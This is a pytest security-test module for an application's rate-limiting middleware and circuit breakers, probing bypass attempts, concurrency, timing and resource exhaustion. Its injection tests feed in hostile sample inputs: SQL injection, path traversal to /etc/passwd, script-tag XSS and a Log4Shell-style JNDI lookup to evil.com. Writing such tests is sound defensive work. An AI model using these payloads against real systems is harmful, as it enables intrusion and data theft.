"""
Security tests for rate limiting and circuit breaker features.

This module provides comprehensive security testing for rate limiting middleware
and circuit breaker functionality, including abuse prevention, DoS protection,
and security bypass attempts.

Tests cover both legitimate usage patterns and malicious attack scenarios
to ensure robust protection against various security threats.
"""

import asyncio
import time
from unittest.mock import AsyncMock, patch

import pytest
from fastapi import FastAPI, HTTPException
from fastapi.testclient import TestClient

from tripsage.api.middlewares.rate_limiting import (
    DragonflyRateLimiter,
    EnhancedRateLimitMiddleware,
    InMemoryRateLimiter,
    RateLimitConfig,
    RateLimitResult,
)
from tripsage_core.infrastructure.resilience.circuit_breaker import (
    CircuitBreakerError,
    CircuitState,
    EnterpriseCircuitBreaker,
    SimpleCircuitBreaker,
    circuit_breaker,
)


class TestRateLimitingSecurity:
    """Security tests for rate limiting middleware."""

    @pytest.fixture
    def rate_limit_config(self) -> RateLimitConfig:
        """Standard rate limit configuration for testing."""
        return RateLimitConfig(
            requests_per_minute=10,
            requests_per_hour=100,
            requests_per_day=1000,
            burst_size=5,
            refill_rate=1.0,
            enable_sliding_window=True,
            enable_token_bucket=True,
        )

    @pytest.fixture
    def in_memory_limiter(self) -> InMemoryRateLimiter:
        """In-memory rate limiter for testing."""
        return InMemoryRateLimiter()

    @pytest.fixture
    def mock_cache_service(self):
        """Mock cache service for DragonflyRateLimiter testing."""
        cache = AsyncMock()
        cache.pipeline.return_value = cache
        cache.execute.return_value = [None, None]  # No existing data
        cache.get.return_value = None
        cache.zcard.return_value = 0
        cache.zadd.return_value = True
        cache.zremrangebyscore.return_value = True
        cache.expire.return_value = True
        cache.set.return_value = True
        cache.delete.return_value = True
        cache.keys.return_value = []
        cache.lpush.return_value = True
        cache.ltrim.return_value = True
        return cache

    @pytest.fixture
    def dragonfly_limiter(self, mock_cache_service) -> DragonflyRateLimiter:
        """DragonflyDB rate limiter with mocked cache service."""
        limiter = DragonflyRateLimiter()
        limiter.cache_service = mock_cache_service
        return limiter

    @pytest.fixture
    def test_app(self, rate_limit_config) -> FastAPI:
        """Test FastAPI app with rate limiting middleware."""
        app = FastAPI()

        @app.get("/test")
        async def test_endpoint():
            return {"message": "success"}

        @app.post("/expensive")
        async def expensive_endpoint():
            await asyncio.sleep(0.1)  # Simulate expensive operation
            return {"message": "expensive operation completed"}

        return app

    @pytest.fixture
    def test_client_with_rate_limiting(self, test_app, rate_limit_config) -> TestClient:
        """Test client with rate limiting middleware enabled."""
        with patch("tripsage_core.services.infrastructure.get_cache_service"):
            middleware = EnhancedRateLimitMiddleware(
                app=test_app,
                use_dragonfly=False,  # Use in-memory for testing
            )

            # Override config for testing
            middleware.configs["unauthenticated"] = rate_limit_config

            test_app.add_middleware(type(middleware).__bases__[0], dispatch=middleware.dispatch)

            return TestClient(test_app)

    async def test_basic_rate_limiting_enforcement(self, in_memory_limiter, rate_limit_config):
        """Test basic rate limiting enforcement."""
        key = "test_user_123"

        # First requests should succeed
        for i in range(rate_limit_config.requests_per_minute):
            result = await in_memory_limiter.check_rate_limit(key, rate_limit_config)
            assert not result.is_limited, f"Request {i + 1} should not be limited"
            assert result.remaining >= 0

        # Next request should be rate limited
        result = await in_memory_limiter.check_rate_limit(key, rate_limit_config)
        assert result.is_limited
        assert result.limit_type == "minute"
        assert result.retry_after_seconds > 0

    async def test_rate_limiting_bypass_attempts(self, in_memory_limiter, rate_limit_config):
        """Test attempts to bypass rate limiting."""
        base_key = "attacker_user"

        # Attempt 1: Slightly different keys (should not bypass)
        similar_keys = [
            base_key,
            base_key + "_",
            base_key.upper(),
            base_key + "1",
            f" {base_key} ",  # With spaces
        ]

        for key in similar_keys:
            # Fill up rate limit for each key separately
            for _i in range(rate_limit_config.requests_per_minute):
                result = await in_memory_limiter.check_rate_limit(key, rate_limit_config)
                if result.is_limited:
                    break

            # Verify rate limiting is applied per key
            result = await in_memory_limiter.check_rate_limit(key, rate_limit_config)
            assert result.is_limited

    async def test_rate_limiting_key_injection_attacks(self, in_memory_limiter, rate_limit_config):
        """Test protection against key injection attacks."""
        malicious_keys = [
            "user_123'; DROP TABLE rate_limits; --",
            "user_123\x00null_byte",
            "user_123\n\rcontrol_chars",
            "../../../etc/passwd",
            "user_123||true",
            "user_123 AND 1=1",
            "user_123<script>alert('xss')</script>",
            "user_123${jndi:ldap://evil.com}",
            "user_123#{eval('malicious')}",
        ]

        for malicious_key in malicious_keys:
            # Should not crash or cause errors
            try:
                result = await in_memory_limiter.check_rate_limit(malicious_key, rate_limit_config)
                assert isinstance(result, RateLimitResult)
            except Exception as e:
                pytest.fail(f"Rate limiter crashed with malicious key '{malicious_key}': {e}")

    async def test_rate_limiting_cost_manipulation(self, in_memory_limiter, rate_limit_config):
        """Test protection against cost manipulation attacks."""
        key = "cost_attacker"

        # Test with various cost values
        test_costs = [
            -1,  # Negative cost
            0,  # Zero cost
            1,  # Normal cost
            999999,  # Extremely high cost
            float("inf"),  # Infinite cost
            float("nan"),  # NaN cost
        ]

        for cost in test_costs:
            try:
                _result = await in_memory_limiter.check_rate_limit(key, rate_limit_config, cost=cost)

                # Should handle invalid costs gracefully
                if cost <= 0 or not isinstance(cost, int):
                    # Should either reject or treat as cost=1
                    pass
                elif cost > 1000:  # Reasonable upper limit
                    # Should either reject or cap the cost
                    pass

            except Exception as e:
                # Should not crash with invalid costs
                assert "cost" in str(e).lower() or "invalid" in str(e).lower()

    async def test_distributed_rate_limiting_security(self, dragonfly_limiter, rate_limit_config):
        """Test security of distributed rate limiting."""
        key = "distributed_user_123"

        # Test basic functionality
        result = await dragonfly_limiter.check_rate_limit(key, rate_limit_config)
        assert not result.is_limited

        # Test cache service failure handling
        dragonfly_limiter.cache_service = None
        result = await dragonfly_limiter.check_rate_limit(key, rate_limit_config)
        assert isinstance(result, RateLimitResult)  # Should fallback gracefully

    async def test_rate_limiting_timing_attacks(self, in_memory_limiter, rate_limit_config):
        """Test protection against timing attacks on rate limiting."""
        key = "timing_attacker"

        # Measure response times for different scenarios
        times = []

        # Time normal requests
        for _ in range(3):
            start = time.time()
            await in_memory_limiter.check_rate_limit(key, rate_limit_config)
            end = time.time()
            times.append(end - start)

        # Fill rate limit
        for _ in range(rate_limit_config.requests_per_minute):
            await in_memory_limiter.check_rate_limit(key, rate_limit_config)

        # Time rate-limited requests
        limited_times = []
        for _ in range(3):
            start = time.time()
            await in_memory_limiter.check_rate_limit(key, rate_limit_config)
            end = time.time()
            limited_times.append(end - start)

        # Rate-limited responses should not be significantly slower
        # This could indicate information leakage
        avg_normal = sum(times) / len(times)
        avg_limited = sum(limited_times) / len(limited_times)

        # Allow some variation but not orders of magnitude
        assert avg_limited < avg_normal * 10, "Rate limiting timing attack vulnerability"

    async def test_rate_limiting_concurrent_attacks(self, in_memory_limiter, rate_limit_config):
        """Test rate limiting under concurrent attack scenarios."""
        key = "concurrent_attacker"

        async def attack_task():
            """Single attack task."""
            results = []
            for _ in range(20):  # Try to exceed rate limit
                result = await in_memory_limiter.check_rate_limit(key, rate_limit_config)
                results.append(result.is_limited)
                await asyncio.sleep(0.01)  # Small delay
            return results

        # Launch concurrent attacks
        tasks = [attack_task() for _ in range(5)]
        all_results = await asyncio.gather(*tasks)

        # Count total requests that were allowed
        total_allowed = 0
        for results in all_results:
            total_allowed += sum(1 for limited in results if not limited)

        # Should not significantly exceed rate limit due to race conditions
        # Allow some margin for timing variations
        max_allowed = rate_limit_config.requests_per_minute * 1.2
        assert total_allowed <= max_allowed, f"Rate limiting failed under concurrency: {total_allowed} > {max_allowed}"

    async def test_rate_limiting_memory_exhaustion_protection(self, in_memory_limiter, rate_limit_config):
        """Test protection against memory exhaustion attacks."""
        # Create many unique keys to test memory usage
        num_keys = 10000
        keys = [f"memory_attack_user_{i}" for i in range(num_keys)]

        # Should not crash or consume excessive memory
        try:
            for key in keys:
                await in_memory_limiter.check_rate_limit(key, rate_limit_config)

            # Verify cleanup occurs (implementation dependent)
            # In production, should have key expiration/cleanup

        except MemoryError:
            pytest.fail("Rate limiter vulnerable to memory exhaustion")

    def test_rate_limiting_http_header_injection(self, test_client_with_rate_limiting):
        """Test rate limiting with malicious HTTP headers."""
        malicious_headers = [
            {"X-Real-IP": "'; DROP TABLE users; --"},
            {"X-Forwarded-For": "<script>alert('xss')</script>"},
            {"User-Agent": "\x00\x01\x02malicious"},
            {"X-Real-IP": "999.999.999.999"},  # Invalid IP
            {"X-Forwarded-For": "localhost, 127.0.0.1, evil.com"},
        ]

        for headers in malicious_headers:
            response = test_client_with_rate_limiting.get("/test", headers=headers)
            # Should not crash or cause errors
            assert response.status_code in [200, 429]

    def test_rate_limiting_response_headers_security(self, test_client_with_rate_limiting):
        """Test security of rate limiting response headers."""
        response = test_client_with_rate_limiting.get("/test")

        # Check for information disclosure in headers
        sensitive_headers = [
            "X-RateLimit-Service",
            "X-RateLimit-Tokens-Remaining",
            "X-RateLimit-Cost",
        ]

        for header in sensitive_headers:
            if header in response.headers:
                # Ensure values don't disclose sensitive information
                value = response.headers[header]
                assert "password" not in value.lower()
                assert "secret" not in value.lower()
                assert "key" not in value.lower()

    def test_rate_limiting_bypass_via_method_override(self, test_client_with_rate_limiting):
        """Test rate limiting bypass attempts via HTTP method override."""
        # Some frameworks allow method override via headers
        override_headers = [
            {"X-HTTP-Method-Override": "GET"},
            {"X-Method-Override": "GET"},
            {"_method": "GET"},
        ]

        for headers in override_headers:
            response = test_client_with_rate_limiting.post("/test", headers=headers)
            # Should apply rate limiting regardless of override attempts
            assert response.status_code in [200, 405, 429]


class TestCircuitBreakerSecurity:
    """Security tests for circuit breaker functionality."""

    @pytest.fixture
    def simple_breaker(self) -> SimpleCircuitBreaker:
        """Simple circuit breaker for testing."""
        return SimpleCircuitBreaker(
            name="test_simple",
            max_retries=3,
            base_delay=0.1,
            max_delay=1.0,
            timeout=5.0,
        )

    @pytest.fixture
    def enterprise_breaker(self) -> EnterpriseCircuitBreaker:
        """Enterprise circuit breaker for testing."""
        return EnterpriseCircuitBreaker(
            name="test_enterprise",
            failure_threshold=3,
            success_threshold=2,
            timeout=5.0,
            max_retries=2,
        )

    def test_circuit_breaker_dos_protection(self, enterprise_breaker):
        """Test circuit breaker protection against DoS attacks."""

        @enterprise_breaker
        def failing_service():
            """Service that always fails."""
            raise Exception("Service unavailable")

        # Trigger circuit breaker
        for _i in range(5):
            try:
                failing_service()
            except Exception:
                pass

        # Circuit should be open, protecting against further requests
        assert enterprise_breaker.state == CircuitState.OPEN

        # Further requests should fail fast
        start_time = time.time()
        with pytest.raises(CircuitBreakerError):
            failing_service()
        end_time = time.time()

        # Should fail fast (less than 1 second)
        assert (end_time - start_time) < 1.0

    def test_circuit_breaker_name_injection(self):
        """Test circuit breaker with malicious names."""
        malicious_names = [
            "'; DROP TABLE circuits; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "\x00null_byte",
            "name\n\rwith_newlines",
            "extremely_long_name_" + "a" * 1000,
        ]

        for name in malicious_names:
            try:
                breaker = circuit_breaker(name=name)
                assert breaker.name == name  # Should store safely

                # Should not cause errors during operation
                @breaker
                def test_func():
                    return "success"

                result = test_func()
                assert result == "success"

            except Exception as e:
                # Should handle malicious names gracefully
                assert "name" in str(e).lower() or "invalid" in str(e).lower()

    def test_circuit_breaker_state_manipulation(self, enterprise_breaker):
        """Test protection against state manipulation attacks."""

        @enterprise_breaker
        def test_service():
            return "success"

        # Attempt to manipulate state directly
        _original_state = enterprise_breaker.state

        # These should not affect circuit behavior
        enterprise_breaker.state = CircuitState.OPEN
        enterprise_breaker.failure_count = -1
        enterprise_breaker.success_count = -1

        # Circuit should still function correctly
        try:
            _result = test_service()
            # Behavior depends on implementation
        except CircuitBreakerError:
            # Expected if state was actually changed
            pass

    async def test_circuit_breaker_concurrent_state_corruption(self, enterprise_breaker):
        """Test circuit breaker state consistency under concurrent access."""

        @enterprise_breaker
        async def concurrent_service(should_fail: bool = False):
            if should_fail:
                raise Exception("Intentional failure")
            await asyncio.sleep(0.01)
            return "success"

        async def attack_task(fail_rate: float):
            """Task that randomly fails to test state consistency."""
            for _ in range(10):
                try:
                    should_fail = time.time() % 1.0 < fail_rate
                    await concurrent_service(should_fail)
                except Exception:
                    pass
                await asyncio.sleep(0.001)

        # Run concurrent tasks with different failure rates
        tasks = [
            attack_task(0.3),  # 30% failure
            attack_task(0.5),  # 50% failure
            attack_task(0.7),  # 70% failure
        ]

        await asyncio.gather(*tasks)

        # State should be consistent (not corrupted)
        state = enterprise_breaker.get_state()
        assert state["failure_count"] >= 0
        assert state["success_count"] >= 0
        assert isinstance(state["state"], str)

    def test_circuit_breaker_exception_type_bypass(self, simple_breaker):
        """Test attempts to bypass circuit breaker with different exception types."""

        # Configure breaker to only trigger on specific exceptions
        breaker_with_filter = SimpleCircuitBreaker(name="filtered_breaker", exceptions=[ValueError, TypeError])

        @breaker_with_filter
        def service_with_different_exceptions(exception_type):
            if exception_type == "value":
                raise ValueError("Value error")
            elif exception_type == "type":
                raise TypeError("Type error")
            elif exception_type == "runtime":
                raise RuntimeError("Runtime error")  # Should not trigger circuit
            else:
                return "success"

        # Trigger circuit with filtered exceptions
        for _ in range(5):
            try:
                service_with_different_exceptions("value")
            except ValueError:
                pass

        # RuntimeError should not be affected by circuit state
        try:
            service_with_different_exceptions("runtime")
        except RuntimeError:
            pass  # Expected
        except Exception as e:
            # Should not be circuit breaker error
            assert not isinstance(e, CircuitBreakerError)

    def test_circuit_breaker_resource_exhaustion_protection(self, enterprise_breaker):
        """Test circuit breaker protection against resource exhaustion."""

        @enterprise_breaker
        def resource_intensive_service():
            # Simulate resource-intensive operation
            time.sleep(0.1)
            raise Exception("Resource exhausted")

        # Trigger failures to open circuit
        for _ in range(5):
            try:
                resource_intensive_service()
            except Exception:
                pass

        # When circuit is open, should fail fast without consuming resources
        start_time = time.time()
        for _ in range(10):
            try:
                resource_intensive_service()
            except CircuitBreakerError:
                pass
        end_time = time.time()

        # Should take much less time than if all requests were processed
        total_time = end_time - start_time
        assert total_time < 0.5, f"Circuit breaker not protecting resources: {total_time}s"

    def test_circuit_breaker_metrics_information_disclosure(self, enterprise_breaker):
        """Test circuit breaker metrics for information disclosure."""

        @enterprise_breaker
        def service_with_sensitive_data():
            # Simulate service that might expose sensitive info in exceptions
            raise Exception("Database password: secret123")

        # Trigger some failures
        for _ in range(3):
            try:
                service_with_sensitive_data()
            except Exception:
                pass

        # Check metrics for information disclosure
        _state = enterprise_breaker.get_state()
        metrics = enterprise_breaker.metrics.get_summary()

        # Sensitive information should not be exposed in metrics
        for _key, value in metrics.items():
            if isinstance(value, str):
                assert "password" not in value.lower()
                assert "secret" not in value.lower()
                assert "key" not in value.lower()

    def test_circuit_breaker_configuration_tampering(self):
        """Test protection against configuration tampering."""
        breaker = circuit_breaker(name="config_test", failure_threshold=3, timeout=10.0)

        # Store original configuration
        if isinstance(breaker, EnterpriseCircuitBreaker):
            _original_threshold = breaker.failure_threshold
            _original_timeout = breaker.timeout

            # Attempt to modify configuration
            breaker.failure_threshold = 999999  # Very high threshold
            breaker.timeout = 0.001  # Very short timeout

            # Verify if modifications take effect (depends on implementation)
            # Ideally, critical config should be immutable
            @breaker
            def test_service():
                raise Exception("Test failure")

            # Test behavior with modified config
            try:
                test_service()
            except Exception:
                pass

    def test_circuit_breaker_timing_attack_resistance(self, enterprise_breaker):
        """Test circuit breaker resistance to timing attacks."""

        @enterprise_breaker
        def timing_sensitive_service(user_exists: bool):
            if user_exists:
                time.sleep(0.1)  # Simulate database lookup
                raise Exception("User found but access denied")
            else:
                raise Exception("User not found")

        # Measure timing for different scenarios
        times_user_exists = []
        times_user_not_exists = []

        for _ in range(5):
            # Test with user exists
            start = time.time()
            try:
                timing_sensitive_service(True)
            except Exception:
                pass
            end = time.time()
            times_user_exists.append(end - start)

            # Test with user not exists
            start = time.time()
            try:
                timing_sensitive_service(False)
            except Exception:
                pass
            end = time.time()
            times_user_not_exists.append(end - start)

        # Open the circuit
        for _ in range(5):
            try:
                timing_sensitive_service(True)
            except Exception:
                pass

        # When circuit is open, timing should be consistent
        # regardless of input parameters
        if enterprise_breaker.state == CircuitState.OPEN:
            circuit_times = []
            for user_exists in [True, False, True, False]:
                start = time.time()
                try:
                    timing_sensitive_service(user_exists)
                except CircuitBreakerError:
                    pass
                end = time.time()
                circuit_times.append(end - start)

            # All circuit breaker responses should have similar timing
            max_time = max(circuit_times)
            min_time = min(circuit_times)
            time_variance = max_time - min_time

            # Should not have significant timing differences
            assert time_variance < 0.01, "Circuit breaker timing attack vulnerability"


class TestRateLimitingCircuitBreakerIntegration:
    """Integration security tests for rate limiting and circuit breaker."""

    @pytest.fixture
    def integrated_service(self):
        """Service with both rate limiting and circuit breaker."""
        from tripsage.api.middlewares.rate_limiting import RateLimitConfig

        # Create circuit breaker
        service_breaker = circuit_breaker(name="integrated_service", failure_threshold=3, timeout=5.0)

        # Create rate limiter
        rate_limiter = InMemoryRateLimiter()
        rate_config = RateLimitConfig(requests_per_minute=10)

        async def protected_service(user_id: str, should_fail: bool = False):
            # Check rate limit first
            result = await rate_limiter.check_rate_limit(user_id, rate_config)
            if result.is_limited:
                raise HTTPException(status_code=429, detail="Rate limited")

            # Apply circuit breaker
            @service_breaker
            def service_call():
                if should_fail:
                    raise Exception("Service failure")
                return {"status": "success", "user_id": user_id}

            return service_call()

        return protected_service, rate_limiter, service_breaker

    async def test_coordinated_attack_protection(self, integrated_service):
        """Test protection against coordinated attacks on both systems."""
        protected_service, rate_limiter, service_breaker = integrated_service

        user_id = "attacker_123"

        # Phase 1: Try to overwhelm with high request rate
        rate_limited_count = 0
        for _i in range(20):  # Exceed rate limit
            try:
                await protected_service(user_id, should_fail=False)
            except HTTPException as e:
                if e.status_code == 429:
                    rate_limited_count += 1

        assert rate_limited_count > 0, "Rate limiting not working"

        # Phase 2: Try to trigger circuit breaker with failures
        for _ in range(5):
            try:
                await protected_service(f"different_user_{_}", should_fail=True)
            except Exception:
                pass

        # Both protections should be active
        # Rate limiting protects against volume
        # Circuit breaker protects against cascading failures

    async def test_bypass_attempt_via_system_interaction(self, integrated_service):
        """Test attempts to bypass protections by exploiting system interactions."""
        protected_service, rate_limiter, service_breaker = integrated_service

        # Attempt 1: Use circuit breaker to bypass rate limiting
        # (Rate limiting might not apply if circuit is open)
        user_id = "bypass_attacker"

        # First, trigger circuit breaker
        for _ in range(5):
            try:
                await protected_service(user_id, should_fail=True)
            except Exception:
                pass

        # Now try rapid requests - should still be rate limited
        rate_limited_count = 0
        for _ in range(15):
            try:
                await protected_service(user_id, should_fail=False)
            except Exception as e:
                if "rate limit" in str(e).lower() or "429" in str(e):
                    rate_limited_count += 1

        # Rate limiting should still apply even when circuit breaker is involved

    async def test_resource_exhaustion_via_combined_systems(self, integrated_service):
        """Test resource exhaustion attacks targeting both systems."""
        protected_service, rate_limiter, service_breaker = integrated_service

        # Create many users to test memory usage
        users = [f"memory_user_{i}" for i in range(1000)]

        start_time = time.time()

        for user in users:
            try:
                await protected_service(user, should_fail=False)
            except Exception:
                pass

        end_time = time.time()

        # Should not take excessive time due to proper rate limiting
        total_time = end_time - start_time
        assert total_time < 30, f"Combined systems vulnerable to resource exhaustion: {total_time}s"

    async def test_state_consistency_under_attack(self, integrated_service):
        """Test state consistency when both systems are under attack."""
        protected_service, rate_limiter, service_breaker = integrated_service

        async def attack_task(user_prefix: str, fail_rate: float):
            """Concurrent attack task."""
            for i in range(50):
                user_id = f"{user_prefix}_{i}"
                should_fail = (i % 10) < (fail_rate * 10)
                try:
                    await protected_service(user_id, should_fail=should_fail)
                except Exception:
                    pass
                await asyncio.sleep(0.001)

        # Launch multiple concurrent attack tasks
        tasks = [
            attack_task("attacker_a", 0.3),
            attack_task("attacker_b", 0.5),
            attack_task("attacker_c", 0.7),
        ]

        await asyncio.gather(*tasks)

        # Both systems should maintain consistent state
        # Rate limiter should have tracked requests properly
        # Circuit breaker should have consistent failure counts

        if isinstance(service_breaker, EnterpriseCircuitBreaker):
            state = service_breaker.get_state()
            assert state["failure_count"] >= 0
            assert isinstance(state["state"], str)

    def test_configuration_interaction_vulnerabilities(self):
        """Test for vulnerabilities in system configuration interactions."""

        # Test conflicting configurations
        _very_permissive_rate_config = RateLimitConfig(
            requests_per_minute=999999,
            requests_per_hour=999999,
            requests_per_day=999999,
        )

        very_strict_circuit_config = circuit_breaker(
            name="strict_circuit",
            failure_threshold=1,  # Triggers immediately
            timeout=0.001,  # Very short timeout
        )

        # These conflicting configs shouldn't create vulnerabilities
        # Rate limiter allows many requests, but circuit breaker is very strict
        # Should not create undefined behavior

        @very_strict_circuit_config
        def conflicted_service():
            raise Exception("Always fails")

        # Should handle gracefully without creating security issues
        try:
            conflicted_service()
        except Exception:
            pass
